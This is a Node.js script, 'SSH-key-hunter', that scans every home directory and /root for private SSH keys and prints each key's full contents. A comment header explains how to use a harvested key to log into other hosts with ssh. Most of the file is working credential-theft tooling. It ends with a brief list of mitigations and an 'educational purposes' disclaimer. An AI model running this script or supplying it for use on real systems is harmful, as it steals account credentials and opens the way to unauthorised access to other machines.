/*
SSH-key-hunter

Automating the process of locating and retrieving SSH private keys across multiple user accounts on a system.

To run the script
node SSH-Key-hunter.js



# SSH Private Key Usage Guide

The private SSH key can be used to access systems where your public key is authorized for SSH access.

## Asssumptions

- The script found the private key file (e.g., `id_rsa`).
- Know the hostname or IP address of the target system.
- Have the appropriate username for the target system.

## Steps to Use the Private Key

### 1. Ensure the Private Key is Secure

Make sure the private key file is secure and has the correct permissions. Typically, the permissions should be set to `600` to ensure only the owner can read and write to the file.

```sh
chmod 600 /path/to/your/private/key
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

### 2. Use the private key for SSH Access

bash
```
ssh -i /path/to/your/private/key username@hostname
ssh -i ~/.ssh/id_rsa john@example.com
```

configure SSH config
Edit ~/.ssh/config file to use the private key for a specific hostname
Host example.com
    HostName example.com
    User john
    IdentityFile ~/.ssh/id_rsa

Then

bash
```
ssh example.com
``
*/

const fs = require('fs');
const path = require('path');

const ctx = {
    fs: {
        dir_contents: (dirPath) => {
            try {
                return fs.readdirSync(dirPath);
            } catch (error) {
                return null;
            }
        },
        read_file: (filePath) => {
            try {
                return fs.readFileSync(filePath, 'utf-8');
            } catch (error) {
                return null;
            }
        }
    },
    output: (message) => {
        console.log(message);
    }
};

function privatekeys_for_user(path) {
    const ssh_dir = ctx.fs.dir_contents(`${path}/.ssh`);

    if (!ssh_dir) {
        ctx.output(`No .ssh directory found for user at ${path}`);
        return [];
    }

    return ssh_dir.filter(x => x.startsWith("id") && !x.endsWith(".pub"));
}

function get_ssh_keys() {
    const users = ctx.fs.dir_contents("/home");

    if (!users) {
        ctx.output("No users found in /home directory");
        return;
    }

    for (const u of users) {
        ctx.output(`Checking user: ${u}`);
        const keys = privatekeys_for_user(`/home/${u}`);
        if (keys.length > 0) {
            keys.forEach(key => {
                const keyPath = `/home/${u}/.ssh/${key}`;
                const keyContent = ctx.fs.read_file(keyPath);
                if (keyContent) {
                    ctx.output(`Found private key for ${u}: ${keyPath}`);
                    ctx.output(`Key Content:\n${keyContent}\n`);
                } else {
                    ctx.output(`Could not read private key for ${u}: ${keyPath}`);
                }
            });
        } else {
            ctx.output(`No private keys found for user: ${u}`);
        }
    }

    ctx.output(`Checking root user:`);
    const root_keys = privatekeys_for_user(`/root`);
    if (root_keys.length > 0) {
        root_keys.forEach(key => {
            const keyPath = `/root/.ssh/${key}`;
            const keyContent = ctx.fs.read_file(keyPath);
            if (keyContent) {
                ctx.output(`Found private key for root: ${keyPath}`);
                ctx.output(`Key Content:\n${keyContent}\n`);
            } else {
                ctx.output(`Could not read private key for root: ${keyPath}`);
            }
        });
    } else {
        ctx.output(`No private keys found for root user`);
    }
}

ctx.output("Hunting for SSH Keys");
get_ssh_keys();


/*
## Mitigation Strategies:
To protect against these threats, consider the following best practices:

- Strong Key Management: Use strong, unique passphrases for your private keys and store them securely.
- Regular Rotation: Rotate your SSH keys periodically and revoke old keys.
- Access Controls: Implement strict access controls and monitor SSH access logs for unusual activity.
- Multi-Factor Authentication (MFA): Use MFA in addition to SSH keys for an extra layer of security.
- Key Revocation: Have a plan for revoking compromised keys and notifying affected systems.
- Regular Audits: Conduct regular security audits and vulnerability assessments to identify and mitigate potential risks.


Disclaimer
For educational purposes

*/
